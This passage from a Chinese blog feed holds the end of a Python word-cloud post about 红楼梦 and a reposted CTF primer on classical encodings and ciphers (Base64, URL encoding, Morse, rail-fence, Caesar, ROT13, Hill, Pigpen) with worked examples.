string-interpolation"><span class="token string">f'词语       次数\n'</span></span><span class="token punctuation">)</span><span class="token comment">#在这里先写入表头</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    word<span class="token punctuation">,</span> count <span class="token operator">=</span> lists<span class="token punctuation">[</span>i<span class="token punctuation">]</span>    <span class="token builtin">file</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span>word <span class="token operator">+</span> <span class="token string-interpolation"><span class="token string">f'       </span><span class="token interpolation"><span class="token punctuation">&#123;</span>count<span class="token punctuation">&#125;</span></span><span class="token string">\n'</span></span><span class="token punctuation">)</span><span class="token builtin">file</span><span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    word<span class="token punctuation">,</span> count <span class="token operator">=</span> lists<span class="token punctuation">[</span>i<span class="token punctuation">]</span>    <span class="token comment">#for循环输出频率前100的</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"&#123;0:&lt;5&#125;&#123;1:>5&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>word<span class="token punctuation">,</span> count<span class="token punctuation">)</span><span class="token punctuation">)</span>a<span class="token operator">=</span>pd<span class="token punctuation">.</span>read_table<span class="token punctuation">(</span><span class="token string">'红楼梦词频统计.txt'</span><span class="token punctuation">,</span>encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">,</span>sep<span class="token operator">=</span><span class="token string">'       '</span><span class="token punctuation">,</span>engine<span class="token operator">=</span><span class="token string">'python'</span><span class="token punctuation">)</span>df<span class="token operator">=</span>pd<span class="token punctuation">.</span>DataFrame<span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token comment">#fit_word函数，接受字典类型，其他类型会报错</span>dic<span class="token operator">=</span><span class="token builtin">dict</span><span class="token punctuation">(</span><span class="token builtin">zip</span><span class="token punctuation">(</span>df<span class="token punctuation">[</span><span class="token string">'词语'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>df<span class="token punctuation">[</span><span class="token string">'次数'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#通过PIL库设置背景图片</span>bg<span class="token operator">=</span>np<span class="token punctuation">.</span>array<span class="token punctuation">(</span>Image<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"城市.png"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#当使用PlL.Image.open()打开图片后，如果要使用函数，需要先将image形式转换成array数组,这里是由于两个数组存储顺序不一致，</span>wordcloud <span class="token operator">=</span> WordCloud<span class="token punctuation">(</span>font_path<span class="token operator">=</span><span class="token string">'simhei.ttf'</span><span class="token punctuation">,</span>mask<span class="token operator">=</span>bg<span class="token punctuation">,</span>background_color<span class="token operator">=</span><span class="token string">"white"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>fit_words<span class="token punctuation">(</span>dic<span class="token punctuation">)</span>plt<span class="token punctuation">.</span>imshow<span class="token punctuation">(</span>wordcloud<span class="token punctuation">)</span><span class="token comment"># 显示</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="./python%E7%BB%98%E5%9B%BE%E5%8F%8A%E5%8F%AF%E8%A7%86%E5%8C%96%E5%A4%87%E8%AF%BE/Figure_29.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF中那些有趣的编码与解码方式</title>
      <link href="/2021/10/19/CTF%E4%B8%AD%E9%82%A3%E4%BA%9B%E6%9C%89%E8%B6%A3%E7%9A%84%E7%BC%96%E7%A0%81%E4%B8%8E%E8%A7%A3%E7%A0%81%E6%96%B9%E5%BC%8F/"/>
      <url>/2021/10/19/CTF%E4%B8%AD%E9%82%A3%E4%BA%9B%E6%9C%89%E8%B6%A3%E7%9A%84%E7%BC%96%E7%A0%81%E4%B8%8E%E8%A7%A3%E7%A0%81%E6%96%B9%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<h2 id="ctf中那些脑洞大开的编码和加密">CTF中那些脑洞大开的编码和加密</h2><p>转载版本，还是推荐大家去看《CTF中那些脑洞大开的编码和加密》这篇文章</p><h2 id="01-目录">01 目录</h2><p>[TOC]</p><h2 id="02-正文">02 正文</h2><h3 id="常见编码">常见编码</h3><h4 id="1-ascii编码">1.ASCII编码</h4><p>ASCII编码大致可以分作三部分组成：</p><ul><li>第一部分是：ASCII非打印控制字符 参详ASCII码表中0-31</li><li>第二部分是：ASCII打印字符，也就是CTF中常用到的转换</li><li>第三部分是：扩展ASCII打印字符 第一第三部分详见 <a href="http://www.asciima.com/">ASCII码表</a> 解释</li></ul><img src=".\CTF中那些有趣的编码与解码方式\ASCII编码映射表.jpg" style="zoom: 80%;" /><p>对应可以转换成二进制，八进制，十六进制等</p><p>源文本： <code>The quick brown fox jumps over the lazy dog</code></p><p>ASCII编码对应十进制：</p><pre class="line-numbers language-none"><code class="language-none">84 104 101 32 113 117 105 99 107 32 98 114 111 119 110 32 102 111 120 32 106 117 109 112 115 32 111 118 101 114 32 116 104 101 32 108 97 122 121 32 100 111 103<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="2-base64-32-16编码">2.Base64/32/16编码</h4><p>base64、base32、base16可以分别编码转化8位字节为6位、5位、4位。16,32,64分别表示用多少个字符来编码，这里我注重介绍base64。Base64常用于在通常处理文本数据的场合，表示、传输、存储一些二进制数据。包括MIME的email，email</p><p>编码原理：Base64编码要求把3个8位字节转化为4个6位的字节，之后在6位的前面补两个0，形成8位一个字节的形式，6位2进制能表示的最大数是2的6次方是64，这也是为什么是64个字符(A-Z,a-z，0-9，+，/这64个编码字符，=号不属于编码字符，而是填充字符)的原因，这样就需要一张映射表，如下：</p><img src=".\CTF中那些有趣的编码与解码方式\Base64映射表" style="zoom:80%;" /><h4 id="3-shellcode编码">3.shellcode编码</h4><p>源文本： <code>The quick brown fox jumps over the lazy dog</code></p><p>编码后：</p><pre class="line-numbers language-none"><code class="language-none">#!shell\x54\x68\x65\x7f\x71\x75\x69\x63\x6b\x7f\x62\x72\x6f\x77\x6e\x7f\x66\x6f\x78\x7f\x6a\x75\x6d\x70\x73\x7f\x6f\x76\x65\x72\x7f\x74\x68\x65\x7f\x6c\x61\x7a\x79\x7f\x64\x6f\x67<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="4-quoted-printable-编码">4.Quoted-printable 编码</h4><p>它是多用途互联网邮件扩展（MIME) 一种实现方式。有时候我们可以邮件头里面能够看到这样的编码，编码原理 <a href="http://blog.chacuo.net/494.html">参考Quoted-printable 编码介绍、编码解码转换</a></p><p>源文本： <code>敏捷的棕色狐狸跳过了懒惰的狗</code></p><p>编码后：</p><pre class="line-numbers language-#!shell" data-language="#!shell"><code class="language-#!shell">&#x3D;E6&#x3D;95&#x3D;8F&#x3D;E6&#x3D;8D&#x3D;B7&#x3D;E7&#x3D;9A&#x3D;84&#x3D;E6&#x3D;A3&#x3D;95&#x3D;E8&#x3D;89&#x3D;B2&#x3D;E7&#x3D;8B&#x3D;90&#x3D;E7&#x3D;8B&#x3D;B8&#x3D;E8&#x3D;B7&#x3D;B3&#x3D;E8&#x3D;BF&#x3D;87&#x3D;E4&#x3D;BA&#x3D;86&#x3D;E6&#x3D;87&#x3D;92&#x3D;E6&#x3D;83&#x3D;B0&#x3D;E7&#x3D;9A&#x3D;84&#x3D;E7&#x3D;8B&#x3D;97<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>编码解码 <a href="http://www.mxcz.net/tools/QuotedPrintable.aspx">链接</a></p><h4 id="5-xxencode编码">5.XXencode编码</h4><blockquote><p>XXencode将输入文本以每三个字节为单位进行编码</p></blockquote><p>如果最后剩下的资料少于三个字节，不够的部份用零补齐。这三个字节共有24个Bit，以6bit为单位分为4个组，每个组以十进制来表示所出现的数值只会落在0到63之间。以所对应值的位置字符代替。它所选择的可打印字符是：±0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz，一共64个字符。跟base64打印字符相比，就是UUencode多一个“-”字符，少一个”/” 字符</p><img src="C:\Users\888888\Desktop\博客更新\CTF中那些有趣的编码与解码方式\XXencode编码过程" style="zoom: 80%;" /><p>源文本： <code>The quick brown fox jumps over the lazy dog</code></p><p>编码后： <code>hJ4VZ653pOKBf647mPrRi64NjS0-eRKpkQm-jRaJm65FcNG-gMLdt64FjNkc+</code></p><p>编码解码 <a href="http://web.chacuo.net/charsetxxencode">链接</a></p><h4 id="6-uuencode编码">6.UUencode编码</h4><blockquote><p>UUencode是一种二进制到文字的编码，最早在unix 邮件系统中使用，全称：Unix-to-Unix encoding</p></blockquote><p>UUencode将输入文本以每三个字节为单位进行编码，如果最后剩下的资料少于三个字节，不够的部份用零补齐。三个字节共有24个Bit，以6-bit为单位分为4个组，每个组以十进制来表示所出现的字节的数值。这个数值只会落在0到63之间。然后将每个数加上32，所产生的结果刚好落在ASCII字符集中可打印字符（32-空白…95-底线）的范围之中。</p><p>源文本： <code>The quick brown fox jumps over the lazy dog</code></p><p>编码后：``M5&amp;AE(’%U:6-K(&amp;)R;W=N(&amp;9O&gt;&quot;!J=6UP`</p><p>UUencode编码解码链接详见： <a href="http://web.chacuo.net/charsetuuencode">编码解码链接</a></p><h4 id="7-url编码">7.URL编码</h4><p>url编码又叫百分号编码，是统一资源定位(URL)编码方式。URL地址（常说网址）规定了常用地数字，字母可以直接使用，另外一批作为特殊用户字符也可以直接用（/,:@等），剩下的其它所有字符必须通过%xx编码处理。 现在已经成为一种规范了，基本所有程序语言都有这种编码，如js：有encodeURI、encodeURIComponent，PHP有 urlencode、urldecode等。编码方法很简单，在该字节ascii码的的16进制字符前面加%. 如 空格字符，ascii码是32，对应16进制是’20’，那么urlencode编码结果是:%20。</p><p>源文本： <code>The quick brown fox jumps over the lazy dog</code></p><p>编码后：</p><pre class="line-numbers language-none"><code class="language-none">%54%68%65%20%71%75%69%63%6b%20%62%72%6f%77%6e%20%66%6f%78%20%6a%75%6d%70%73%20%6f%76%65%72%20%74%68%65%20%6c%61%7a%79%20%64%6f%67<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>URL编码解码详见： <a href="http://web.chacuo.net/charseturlencode">链接</a></p><h4 id="8-unicode编码">8.Unicode编码</h4><p>Unicode编码有以下四种编码方式：</p><ul><li>源文本： <code>The</code></li><li>&amp;#x [Hex]： <code>The</code></li><li>&amp;# [Decimal]： <code>The</code></li><li>\U [Hex]： <code>\U0054\U0068\U0065</code></li><li>\U+ [Hex]： <code>\U+0054\U+0068\U+0065</code></li></ul><p>Unicode编码解码 <a href="http://www.mxcz.net/tools/Unicode.aspx">链接</a></p><h4 id="9-escape-unescape编码">9.Escape/Unescape编码</h4><blockquote><p>Escape/Unescape加密解码/编码解码,又叫%u编码</p></blockquote><p>采用UTF-16BE模式， Escape编码/加密,就是字符对应UTF-16 16进制表示方式前面加%u。Unescape解码/解密，就是去掉&quot;%u&quot;后，将16进制字符还原后，由UTF-16转码到自己目标字符。如：字符“中”，UTF-16BE是：“6d93”，因此Escape是“%u6d93”。</p><p>源文本： <code>The</code></p><p>编码后： <code>%u0054%u0068%u0065</code></p><h4 id="10-html实体编码">10.HTML实体编码</h4><p><img src="C:%5CUsers%5C888888%5CDesktop%5C%E5%8D%9A%E5%AE%A2%E6%9B%B4%E6%96%B0%5CCTF%E4%B8%AD%E9%82%A3%E4%BA%9B%E6%9C%89%E8%B6%A3%E7%9A%84%E7%BC%96%E7%A0%81%E4%B8%8E%E8%A7%A3%E7%A0%81%E6%96%B9%E5%BC%8F%5CHTML%E5%AE%9E%E4%BD%93%E7%BC%96%E7%A0%81" alt=""></p><p>参考<a href="http://www.w3school.com.cn/tags/html_ref_entities.html">HTML实体编码手册</a></p><h4 id="11-敲击码">11.敲击码</h4><p>敲击码(Tap code)是一种以非常简单的方式对文本信息进行编码的方法。因该编码对信息通过使用一系列的点击声音来编码而命名，敲击码是基于5×5方格波利比奥斯方阵来实现的，不同点是是用K字母被整合到C中</p><p><strong>敲击码表:</strong></p><pre class="line-numbers language-none"><code class="language-none">  1  2  3  4  51 A  B C&#x2F;K D  E2 F  G  H  I  J 3 L  M  N  O  P4 Q  R  S  T  U5 V  W  X  Y  Z<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="12-莫尔斯电码">12.莫尔斯电码</h4><p>摩尔斯电码 [Morse Code] 是由美国人萨缪尔·摩尔斯在1836年发明的一种时通时断的且通过不同的排列顺序来表达不同英文字母、数字和标点符号的信号代码，摩尔斯电码主要由以下5种它的代码组成：</p><ol><li>点（.）</li><li>划（-）</li><li>每个字符间短的停顿（通常用空格表示停顿）</li><li>每个词之间中等的停顿（通常用 <code>/</code> 划分）</li><li>以及句子之间长的停顿</li></ol><p>摩尔斯电码字母和数字对应表：</p><pre class="line-numbers language-none"><code class="language-none">A  .-    N  -.    .  .-.-.-  +  .-.-.    1  .----B  -...  O  ---   ,  --..--  _  ..--.-   2  ..---C  -.-.  P  .--.  :  ---...  $  ...-..-  3  ...--D  -..   Q  --.-  &quot;  .-..-.  &amp;  .-...    4  ....-E  .     R  .-.   &#39;  .----.  &#x2F;  -..-.    5  .....F  ..-.  S  ...   !  -.-.--              6  -....G  --.   T  -     ?  ..--..              7  --...H  ....  U  ..-   @  .--.-.              8  ---..I  ..    V  ...-  -  -....-              9  ----.J  .---  W  .--   ;  -.-.-.              0  -----K  -.-   X  -..-  (  -.--.           L  .-..  Y  -.--  )  -.--.-          M  --    Z  --..  &#x3D;  -...-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>源文本: <code>THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG</code></p><p>编码后:</p><pre class="line-numbers language-none"><code class="language-none">- .... . &#x2F; --.- ..- .. -.-. -.- &#x2F; -... .-. --- .-- -. &#x2F; ..-. --- -..- &#x2F; .--- ..- -- .--. ... &#x2F; --- ...- . .-. &#x2F; - .... . &#x2F; .-.. .- --.. -.-- &#x2F; -.. --- --.<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在线编码解码 <a href="http://rumkin.com/tools/cipher/morse.php">传送门</a></p><p>摩尔斯电码除了能对字母数字编码以外还对一些标点符号，非英语字符进行了编码，而且还有一些特定意义的组合称为特殊符号，比如 <code>·-·-·-·-·-</code> 表达的意思是调用信号，表示“我有消息发送”。如果你感兴趣可以参考 <a href="https://zh.wikipedia.org/wiki/%E6%91%A9%E5%B0%94%E6%96%AF%E7%94%B5%E7%A0%81">WiKi</a> 。</p><h4 id="13-编码的故事">13.编码的故事</h4><p>推荐大家去看 <a href="http://wenku.baidu.com/link?url=kTrscV5j5AsZq5zvBpr2jdkEJW8LqgrkkKsddwWA3YlXmgeqh_be95nMxqbFPOYoVBVy3A6lutlcXVDYLdZ-3iRawJpc0VZ71as07FnxtGS">编码的故事</a> 一文。</p><h3 id="各种文本加密">各种文本加密</h3><p>文本加密可以将正常文本内容打乱为不可连读的文字或符号(汉字 数字 字母 音乐符号 国际音标 盲文 韩文 日文 傣文 彝文 箭头符号 花朵符号 俄文)，换行等格式信息也会被清除，达到加密的作用。在进行文本加密时可以设定一个密码，这样只有知道密码的人才能解密文本。密码可以是数字、字母和下划线，最多九位</p><p>如<strong>音符符号加密</strong></p><blockquote><p>♬♩¶♯♬♭♬♫♫♪♫♫♯=</p></blockquote><p>对于这一种加密方式，还是推荐一个平台，<a href="https://www.qqxiuzi.cn/daohang.htm">千千秀字</a>能解决不少文本加密的。</p><img src=".\CTF中那些有趣的编码与解码方式\千千秀字.png" style="zoom:50%;" /><h3 id="换位加密">换位加密</h3><h4 id="1-栅栏密码">1.栅栏密码</h4><blockquote><p><strong>栅栏密码 [Rail-fence Cipher]</strong> 就是把要加密的明文分成N个一组，然后把每组的第1个字符组合，每组第2个字符组合…每组的第N个字符组合，最后把他们全部连接起来就是密文。最后一个分组可能不足N个</p></blockquote><p><strong>以2栏栅栏加密为例</strong></p><ul><li><p>明文： <code>The quick brown fox jumps over the lazy dog</code></p></li><li><p>去空格： <code>Thequickbrownfoxjumpsoverthelazydog</code></p></li><li><p>分组： <code>Th eq ui ck br ow nf ox ju mp so ve rt he la zy do g</code></p><ul><li>第一组： <code>Teucbonojmsvrhlzdg</code></li><li>第二组： <code>hqikrwfxupoeteayo</code></li></ul></li><li><p>密文： <code>Teucbonojmsvrhlzdghqikrwfxupoeteayo</code></p></li></ul><p>加解密 <a href="http://www.practicalcryptography.com/ciphers/classical-era/rail-fence/">传送门</a></p><h4 id="2-曲路密码">2.曲路密码</h4><blockquote><p>曲路密码(Curve Cipher)是一种换位密码，需要事先双方约定密钥，也就是曲路路径</p></blockquote><p>明文： <code>The quick brown fox jumps over the lazy dog</code></p><p>填入事先约定填充的行列数</p><p><img src="C:%5CUsers%5C888888%5CDesktop%5C%E5%8D%9A%E5%AE%A2%E6%9B%B4%E6%96%B0%5CCTF%E4%B8%AD%E9%82%A3%E4%BA%9B%E6%9C%89%E8%B6%A3%E7%9A%84%E7%BC%96%E7%A0%81%E4%B8%8E%E8%A7%A3%E7%A0%81%E6%96%B9%E5%BC%8F%5C%E5%A1%AB%E5%85%A5%E4%BA%8B%E5%85%88%E7%BA%A6%E5%AE%9A%E5%A1%AB%E5%85%85%E7%9A%84%E8%A1%8C%E5%88%97%E6%95%B0.PNG" alt=""></p><p>加密的回路线 [事先约定填充的行列数]</p><p><img src="C:%5CUsers%5C888888%5CDesktop%5C%E5%8D%9A%E5%AE%A2%E6%9B%B4%E6%96%B0%5CCTF%E4%B8%AD%E9%82%A3%E4%BA%9B%E6%9C%89%E8%B6%A3%E7%9A%84%E7%BC%96%E7%A0%81%E4%B8%8E%E8%A7%A3%E7%A0%81%E6%96%B9%E5%BC%8F%5C%E5%8A%A0%E5%AF%86%E7%9A%84%E5%9B%9E%E8%B7%AF%E7%BA%BF.png" alt=""></p><p>密文： <code>gesfc inpho dtmwu qoury zejre hbxva lookT</code></p><h4 id="3-列移位密码">3.列移位密码</h4><p>列移位密码(Columnar Transposition Cipher)是一种比较简单，易于实现的换位密码，通过一个简单的规则将明文打乱混合成密文。下面我们以明文 The quick brown fox jumps over the lazy dog，密钥 how are u为例：</p><p>填入5行7列表 [事先约定填充的行列数，如果明文不能填充完表格可以约定使用某个字母进行填充]</p><p><img src="C:%5CUsers%5C888888%5CDesktop%5C%E5%8D%9A%E5%AE%A2%E6%9B%B4%E6%96%B0%5CCTF%E4%B8%AD%E9%82%A3%E4%BA%9B%E6%9C%89%E8%B6%A3%E7%9A%84%E7%BC%96%E7%A0%81%E4%B8%8E%E8%A7%A3%E7%A0%81%E6%96%B9%E5%BC%8F%5C5%E8%A1%8C%E4%B8%83%E5%88%97%E8%A1%A8.png" alt=""></p><p>密钥： <code>how are u</code></p><p>按how are u在字母表中的出现的先后顺序进行编号，我们就有a为1,e为2，h为3，o为4，r为5，u为6，w为7，所以先写出a列，其次e列，以此类推写出的结果便是密文：</p><p>密文： <code>qoury inpho Tkool hbxva uwmtd cfseg erjez</code></p><p>这里提供一个行列数相等的填充规则列移位密码加解密 <a href="http://www.practicalcryptography.com/ciphers/classical-era/columnar-transposition/">链接</a></p><p>另外由列移位密码变化来的密码也有其他的，比如 <a href="http://www.thonky.com/kryptos/amsco-cipher">Amsco密码</a> (Amsco Cipher)和 <a href="http://www.thonky.com/kryptos/cadenus-cipher">Cadenus密码</a> (Cadenus Cipher)。</p><h3 id="替换加密">替换加密</h3><h4 id="1-埃特巴什码">1.埃特巴什码</h4><blockquote><p>埃特巴什码 [Atbash Cipher] 是一种以字母倒序排列作为特殊密钥的替换加密，也就是下面的对应关系：</p></blockquote><pre class="line-numbers language-none"><code class="language-none">ABCDEFGHIJKLMNOPQRSTUVWXYZZYXWVUTSRQPONMLKJIHGFEDCBA<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>明文： <code>the quick brown fox jumps over the lazy dog</code></p><p>密文： <code>gsv jfrxp yildm ulc qfnkh levi gsv ozab wlt</code></p><p>加解密 <a href="http://www.practicalcryptography.com/ciphers/classical-era/atbash-cipher/">传送门</a></p><h4 id="2-凯撒密码">2.凯撒密码</h4><p>凯撒密码 [Caesar Cipher或称恺撒加密、恺撒变换、变换加密、位移加密] 是一种替换加密，明文中的所有字母都在字母表上向后（或向前）按照一个固定数目进行偏移后被替换成密文。例，当偏移量是3的时候，所有的字母A将被替换成D，B变成E，以此类推，更多 <a href="https://en.wikipedia.org/wiki/Caesar_cipher">参考</a> 。</p><p>加密实例：</p><p>明文： <code>The quick brown fox jumps over the lazy dog</code></p><p>偏移量：1</p><p>密文： <code>Uif rvjdl cspxo gpy kvnqt pwfs uif mbaz eph</code></p><p>可以使用Python的pycipher模块来加解密，如果提示没有这个模块可以通过 <code>pip install pycipher</code> 或者其他方式来安装pycipher模块。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pycipher <span class="token keyword">import</span> CaesarCaesar<span class="token punctuation">(</span>key<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encipher<span class="token punctuation">(</span><span class="token string">'The quick brown fox jumps over the lazy dog'</span><span class="token punctuation">)</span><span class="token string">'UIFRVJDLCSPXOGPYKVNQTPWFSUIFMBAZEPH'</span>Caesar<span class="token punctuation">(</span>key<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decipher<span class="token punctuation">(</span><span class="token string">'UIFRVJDLCSPXOGPYKVNQTPWFSUIFMBAZEPH'</span><span class="token punctuation">)</span><span class="token string">'THEQUICKBROWNFOXJUMPSOVERTHELAZYDOG'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>参考表(这里是向后移位加密，向前移位解密)：</p><p>加密解密 <a href="http://planetcalc.com/1434/">链接</a> (这个网站可以将26种情况一次性列举出来，比较方便)</p><h4 id="3-rot5-13-18-47">3.ROT5/13/18/47</h4><blockquote><p>ROT5/13/18/47是一种简单的码元位置顺序替换暗码。此类编码具有可逆性，可以自我解密，主要用于应对快速浏览，或者是机器的读取。</p></blockquote><p>ROT5 是 rotate by 5 places 的简写，意思是旋转5个位置，其它皆同。下面分别说说它们的编码方式：</p><ul><li>ROT5：只对数字进行编码，用当前数字往前数的第5个数字替换当前数字，例如当前为0，编码后变成5，当前为1，编码后变成6，以此类推顺序循环</li><li>ROT13：只对字母进行编码，用当前字母往前数的第13个字母替换当前字母，例如当前为A，编码后变成N，当前为B，编码后变成O，以此类推顺序循环</li><li>ROT18：这是一个异类，本来没有，它是将ROT5和ROT13组合在一起，为了好称呼，将其命名为ROT18。</li><li>ROT47：对数字、字母、常用符号进行编码，按照它们的ASCII值进行位置替换，用当前字符ASCII值往前数的第47位对应字符替换当前字符，例如当前为小写字母z，编码后变成大写字母K，当前为数字0，编码后变成符号_。用于ROT47编码的字符其ASCII值范围是33－126，具体可参考ASCII编码</li></ul><p>以rot13以例</p><p>明文： <code>the quick brown fox jumps over the lazy dog</code></p><p>密文： <code>gur dhvpx oebja sbk whzcf bire gur ynml qbt</code></p><p><a href="http://www.qqxiuzi.cn/bianma/ROT5-13-18-47.php">传送门</a></p><h4 id="4-简单替换密码">4.简单替换密码</h4><p>简单换位密码 [Simple Substitution Cipher] 加密方式是以每个明文字母被与之唯一对应且不同的字母替换的方式实现的，它不同于恺撒密码，因为密码字母表的字母不是简单的移位，而是完全是混乱的。 比如：</p><pre class="line-numbers language-none"><code class="language-none">明文字母 : abcdefghijklmnopqrstuvwxyz明文字母 : phqgiumeaylnofdxjkrcvstzwb<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>明文： <code>the quick brown fox jumps over the lazy dog</code></p><p>密文： <code>cei jvaql hkdtf udz yvoxr dsik cei npbw gdm</code></p><p><strong>破解</strong></p><p>当密文数据足够多时这种密码我们可以通过字频分析方法破解或其他方法破解，比较好的在线词频分析网站 <a href="http://quipqiup.com/index.php%EF%BC%8C%E8%BF%99%E9%87%8C%E6%8E%A8%E8%8D%90%E4%B8%80%E7%AF%87%E9%80%9A%E8%BF%87**%22%E7%88%AC%E5%B1%B1%E7%AE%97%E6%B3%95%22**%E6%9D%A5%E7%A0%B4%E8%A7%A3%E7%AE%80%E5%8D%95%E6%9B%BF%E6%8D%A2%E5%AF%86%E7%A0%81">http://quipqiup.com/index.php，这里推荐一篇通过**“爬山算法”**来破解简单替换密码</a> <a href="http://www.practicalcryptography.com/cryptanalysis/stochastic-searching/cryptanalysis-simple-substitution-cipher/">文章</a> ，基于文中的算法实现的工具来破解示例。</p><h4 id="5-希尔密码">5.希尔密码</h4><blockquote><p>希尔密码 [Hill Cipher] 是基于线性代数多重代换密码，由Lester S. Hill在1929年发明</p></blockquote><p>每个字母转换成26进制数字：A=0, B=1, C=2…Z=25一串字母当成n维向量，跟一个N×N的矩阵相乘，再将得出的结果MOD26。<a href="https://en.wikipedia.org/wiki/Hill_cipher">更多参考该链接</a></p><p><strong>破解</strong></p><p>密码分析一门破解编码和密码的艺术。当我们尝试去攻破希尔密码你会发现频率分析实际上没有什么用处，特别在密钥长度增多的情况下。对于较长的二元矩阵（2×2的希尔密码）频率分析可能可能会有帮助，但是对于较短的密文分析是没有实际作用的。</p><p>这里推荐一篇关于用 <a href="http://www.practicalcryptography.com/cryptanalysis/stochastic-searching/cryptanalysis-hill-cipher/">已知明文样本攻击的方式破解希尔密码</a> 的文章，基础的希尔密码用 <a href="https://en.wikipedia.org/wiki/Known-plaintext_attack">已知明文攻击</a> 的方式是可攻破的，由于加密完全是线性的，所以攻击者在截取到部分明文/密文字符对可以轻松建立一个线性系统，轻松搞定希尔密码，如果不能完全确定线性系统，那么只需要添加部分明文/密文对即可。已知明文攻击时最好的方式去破解写入密码，如果明文一无所知，那就进行推测猜出部分明文。基于已知明文样本攻击的方式破解希尔密码的算法的实现工具破解示例：</p><p><strong>解密：</strong></p><p>解密 <a href="http://bobao.360.cn/ctf/learning/136.html">脚本实例</a>，在线加解密 <a href="http://www.practicalcryptography.com/ciphers/hill-cipher/">传送门</a></p><h4 id="6-猪圈密码">6.猪圈密码</h4><p>猪圈密码(Pigpen Cipher或称九宫格密码、朱高密码、共济会密码或共济会员密码)，是一种以格子为基础的简单替代式密码。更多 <a href="https://en.wikipedia.org/wiki/Pigpen_cipher">参考</a></p><p>明文字母和对应密文：</p><img src="C:\Users\888888\Desktop\博客更新\CTF中那些有趣的编码与解码方式\猪圈密码.png" style="zoom: 80%;" /><p>在线加密 <a href="http://www.simonsingh.net/The_Black_Chamber/pigpen.html">传送门</a></p><h5 id="6-1猪圈密码变种">6.1猪圈密码变种</h5><p><strong>圣堂武士密码</strong></p><blockquote><p>圣堂武士密码(Templar Cipher)是共济会的猪圈密码的一个变种，一直被共济会圣殿骑士用</p></blockquote><h4 id="7-波利比奥斯方阵密码">7.波利比奥斯方阵密码</h4><p>波利比奥斯方阵密码 [Polybius Square Cipher或称波利比奥斯棋盘] 是棋盘密码的一种，是利用波利比奥斯方阵进行加密的密码方式，简单的来说就是把字母排列好，用坐标(行列)的形式表现出来。字母是密文，明文便是字母的坐标。更多 <a href="https://en.wikipedia.org/wiki/Polybius_square">参考</a></p><p>常见的排布方式：</p><p><img src="C:%5CUsers%5C888888%5CDesktop%5C%E5%8D%9A%E5%AE%A2%E6%9B%B4%E6%96%B0%5CCTF%E4%B8%AD%E9%82%A3%E4%BA%9B%E6%9C%89%E8%B6%A3%E7%9A%84%E7%BC%96%E7%A0%81%E4%B8%8E%E8%A7%A3%E7%A0%81%E6%96%B9%E5%BC%8F%5C%E6%B3%A2%E5%88%A9%E6%AF%94%E5%A5%A5%E6%96%AF%E6%96%B9%E9%98%B5%E5%AF%86%E7%A0%81.png" alt=""></p><p><strong>加密实例：</strong></p><p>明文： <code>THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG</code></p><p>密文： <code>442315 4145241325 1242345233 213453 2445323543 442315 31115554 143422</code></p><h4 id="8-夏多密码-曲折加密">8.夏多密码  [曲折加密]</h4><p>夏多密码是作者麦克斯韦·格兰特在中篇小说《死亡之链》塑造夏多这一英雄人物中所自创的密码，如下图所示：</p><p><img 